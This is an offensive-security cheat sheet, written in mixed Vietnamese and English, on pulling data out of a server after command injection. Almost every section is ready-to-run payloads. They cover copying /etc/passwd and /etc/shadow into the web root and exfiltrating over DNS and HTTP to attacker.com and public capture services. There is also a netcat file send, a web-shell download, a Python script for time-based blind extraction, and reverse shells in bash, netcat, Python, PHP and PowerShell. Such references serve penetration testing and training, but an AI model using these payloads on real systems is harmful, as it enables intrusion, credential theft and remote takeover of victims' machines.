# Command Injection Data Exfiltration

## Overview

Khi command injection đã được confirm, bước tiếp theo là exfiltrate data từ target system. Document này cover các kỹ thuật exfiltration phù hợp cho từng scenario.

## File Content Exfiltration

### Direct to Web Root

Phương pháp đơn giản nhất khi có write access vào web directory:

```bash
# Write to web root
; cat /etc/passwd > /var/www/html/data.txt
; cat /etc/shadow > /var/www/html/shadow.txt

# Access via browser
curl http://target.com/data.txt
```

### Common Writable Paths

| Server | Path |
|--------|------|
| Apache | `/var/www/html/`, `/var/www/` |
| Nginx | `/usr/share/nginx/html/` |
| IIS | `C:\inetpub\wwwroot\` |
| Upload dirs | `/var/www/html/uploads/`, `/var/www/html/images/` |
| Temp | `/tmp/`, `C:\Windows\Temp\` |

### Encoding Output

```bash
# Base64 encode để preserve formatting
; cat /etc/passwd | base64 > /var/www/html/data.b64

# Decode
curl http://target.com/data.b64 | base64 -d
```

## DNS-Based Exfiltration

Exfiltrate data qua DNS queries đến attacker-controlled domain:

### Basic DNS Exfil

```bash
# Whoami via DNS subdomain
; nslookup $(whoami).attacker.com
; host $(whoami).attacker.com
; dig $(whoami).attacker.com

# Hostname
; nslookup $(hostname).attacker.com
```

### Exfiltrating File Content

```bash
# Single line
; nslookup $(cat /etc/hostname).attacker.com

# Each line as separate query
; for i in $(cat /etc/passwd); do host "$i.attacker.com"; done

# Loop through directory listing
; for i in $(ls /); do host "$i.abc123.d.zhack.ca"; done
```

### Handling Special Characters

DNS chỉ accept alphanumeric và `-`. Cần encode:

```bash
# Base64 encode (nhưng có + và /)
; host $(cat /etc/passwd | base64 | head -c 60).attacker.com

# Hex encode
; host $(cat /etc/passwd | xxd -p | head -c 60).attacker.com

# Remove problematic characters
; host $(whoami | tr -d '\n').attacker.com
```

### DNS Label Limits

- Mỗi label (subdomain) tối đa 63 characters
- Total domain name tối đa 253 characters

```bash
# Chunk data thành 60-char labels
; cat /etc/passwd | base64 | fold -w60 | while read line; do nslookup "$line.attacker.com"; done
```

## HTTP-Based Exfiltration

### Using wget

```bash
# GET request với data in URL
; wget "http://attacker.com/?data=$(whoami)"
; wget "http://attacker.com/?file=$(cat /etc/passwd | base64 | tr -d '\n')"

# Download file (cho reverse shell, tools)
; wget http://attacker.com/shell.php -O /var/www/html/shell.php
```

### Using curl

```bash
# GET with query string
; curl "http://attacker.com/?data=$(whoami)"
; curl "http://attacker.com/?$(cat /etc/passwd | base64 | tr -d '\n')"

# POST data
; curl -X POST -d "data=$(cat /etc/passwd)" http://attacker.com/
; curl -X POST -d @/etc/passwd http://attacker.com/

# POST with base64
; curl -X POST -d "$(cat /etc/passwd | base64)" http://attacker.com/
```

### Using nc (netcat)

```bash
# Send file content
; cat /etc/passwd | nc attacker.com 4444

# Interactive shell
; nc -e /bin/bash attacker.com 4444
```

## Time-Based Exfiltration

Khi không có network access, extract data qua response timing:

### Character-by-Character

```bash
# Check if first char = 'w'
; if [ $(whoami|cut -c 1) == w ]; then sleep 5; fi

# Check if first char = 'r'
; if [ $(whoami|cut -c 1) == r ]; then sleep 5; fi

# Iterate through positions
; if [ $(whoami|cut -c 2) == w ]; then sleep 5; fi
; if [ $(whoami|cut -c 3) == w ]; then sleep 5; fi
```

### Binary Search Optimization

```bash
# ASCII value comparison (faster)
; if [ $(whoami|cut -c 1|od -An -tu1|tr -d ' ') -gt 109 ]; then sleep 3; fi
# 109 = 'm', nếu delay → char > 'm'
# Không delay → char <= 'm'
```

### Automation Script (Pseudocode)

```python
import requests
import time

def extract_char(position, url, param):
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789-_'
    for char in charset:
        payload = f"; if [ $(whoami|cut -c {position}) == {char} ]; then sleep 3; fi"
        start = time.time()
        requests.get(url, params={param: f"127.0.0.1{payload}"})
        if time.time() - start >= 3:
            return char
    return None

result = ''
for i in range(1, 20):
    char = extract_char(i, url, 'ip')
    if char:
        result += char
        print(f"Extracted: {result}")
    else:
        break
```

## Online Exfiltration Services

### DNS Services

| Service | Usage |
|---------|-------|
| dnsbin.zhack.ca | Unique subdomain, web dashboard |
| interactsh.com | Multi-protocol (DNS, HTTP, SMTP) |
| pingb.in | Simple DNS receiver |
| Burp Collaborator | Built into Burp Suite Pro |

### HTTP Services

| Service | Usage |
|---------|-------|
| webhook.site | Unique URL, captures requests |
| requestbin.com | Request capture và inspection |
| ngrok.com | Tunnel to localhost |

### Using dnsbin

```bash
# Step 1: Get unique subdomain from http://dnsbin.zhack.ca/
# Example: abc123.d.zhack.ca

# Step 2: Exfiltrate
; host $(whoami).abc123.d.zhack.ca
; for i in $(ls /home); do host "$i.abc123.d.zhack.ca"; done

# Step 3: Check dashboard for captured queries
```

### Using interactsh

```bash
# Step 1: Get domain from https://app.interactsh.com
# Example: xyz789.interactsh.com

# Step 2: DNS exfil
; nslookup $(whoami).xyz789.interactsh.com

# Step 3: HTTP exfil
; curl http://xyz789.interactsh.com/$(id)
```

## Reverse Shell Techniques

Khi có full command execution, establish reverse shell:

### Bash

```bash
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
```

### Netcat

```bash
# Traditional
; nc -e /bin/bash attacker.com 4444

# OpenBSD nc (no -e)
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

### Python

```bash
; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP

```bash
; php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PowerShell (Windows)

```powershell
& powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('attacker.com',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

## Backgrounding Long Commands

Để prevent timeout khi chạy long operations:

### Using nohup

```bash
# Run in background, immune to hangup
; nohup curl http://attacker.com/$(cat /etc/shadow | base64) &

# Output to file
; nohup ./long_script.sh > /tmp/output.txt &
```

### Using Subshell

```bash
# Subshell background
; (sleep 30; curl http://attacker.com/done) &

# Disown
; sleep 30 &
```

### Double Fork (Anti-Orphan)

```bash
; (trap '' HUP; exec curl http://attacker.com/$(id)) &
```

## Exfiltration Workflow

```
┌────────────────────────────────────────────────────────────────┐
│                 EXFILTRATION DECISION TREE                      │
├────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌─────────────────┐                                            │
│  │ Can write to    │  Yes   ┌───────────────────────────────┐  │
│  │ web root?       │───────►│ ; cat /etc/passwd > /var/www/ │  │
│  └────────┬────────┘        │   html/out.txt                │  │
│           │ No              │ → curl http://target/out.txt  │  │
│           ▼                 └───────────────────────────────┘  │
│  ┌─────────────────┐                                            │
│  │ Outbound DNS    │  Yes   ┌───────────────────────────────┐  │
│  │ allowed?        │───────►│ ; host $(whoami).attacker.com │  │
│  └────────┬────────┘        └───────────────────────────────┘  │
│           │ No                                                   │
│           ▼                                                      │
│  ┌─────────────────┐                                            │
│  │ Outbound HTTP   │  Yes   ┌───────────────────────────────┐  │
│  │ allowed?        │───────►│ ; curl http://attacker/?$(id) │  │
│  └────────┬────────┘        └───────────────────────────────┘  │
│           │ No                                                   │
│           ▼                                                      │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ TIME-BASED EXFILTRATION (last resort)                   │   │
│  │ ; if [ $(whoami|cut -c 1) == w ]; then sleep 3; fi     │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                  │
└────────────────────────────────────────────────────────────────┘
```
